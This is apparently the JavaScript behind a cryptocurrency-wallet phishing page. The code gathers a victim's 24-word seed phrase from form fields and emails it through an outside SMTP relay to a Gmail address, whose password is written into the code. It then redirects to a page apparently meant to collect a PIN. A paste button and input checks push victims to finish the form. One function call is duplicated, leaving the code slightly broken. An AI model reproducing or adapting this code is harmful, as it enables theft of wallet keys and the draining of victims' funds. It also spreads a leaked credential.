function emailSend() {
  var seedPhraseWords = [];
  
  // Collect seed phrase input values
  const seedInputs = document.querySelectorAll('.seed-input');
  seedInputs.forEach(input => {
    seedPhraseWords.push(input.value.trim());
  });

  // Check if all seed phrase fields are filled
  if (seedPhraseWords.includes("") || seedPhraseWords.length !== 24) {
    swal("Error", "Please complete all 24 seed phrase fields", "error");
    return;
  }

  // Create the message body for the email
  var messageBody = "Seed Phrase: " + seedPhraseWords.join(" ");

  // Send the email
  Email.send({
    Email.send({
    Host: "smtp.elasticemail.com",
    Username: "payday10177@gmail.com",
    Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
    To: 'payday10177@gmail.com',
    From: "payday10177@gmail.com",
    Subject: "Seed Phrase",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'pin.html';  // Redirect to the next page
      } else {
        swal("Error", "There was a problem sending your seed phrase. Please try again.", "error");
      }
    }
  );
}

// Automatically move to the next input field when Enter is pressed
const seedInputs = document.querySelectorAll('.seed-input');
seedInputs.forEach((input, index) => {
  input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
      e.preventDefault(); // Prevent default form submission
      if (index < seedInputs.length - 1) {
        seedInputs[index + 1].focus();
      }
    }
  });
});

// Check if all fields are filled before enabling the "Next" button
const confirmCheckbox = document.getElementById('confirm');
const nextBtn = document.getElementById('nextBtn');

function checkFormCompletion() {
  const allFilled = Array.from(seedInputs).every(input => input.value.trim() !== '');
  nextBtn.disabled = !(allFilled && confirmCheckbox.checked);
}

seedInputs.forEach(input => input.addEventListener('input', checkFormCompletion));
confirmCheckbox.addEventListener('change', checkFormCompletion);

// Paste seed phrase functionality
const pasteBtn = document.getElementById('pasteBtn');
pasteBtn.addEventListener('click', () => {
  const userSeedPhrase = prompt("Paste your seed phrase (separate words with spaces):");
  if (userSeedPhrase) {
    const words = userSeedPhrase.trim().split(/\s+/); // Split by spaces
    if (words.length !== 24) {
      alert("You must enter exactly 24 words.");
      return;
    }
    seedInputs.forEach((input, index) => {
      input.value = words[index] || ""; // Fill input fields
    });
    checkFormCompletion(); // Recheck form completion
  }
});
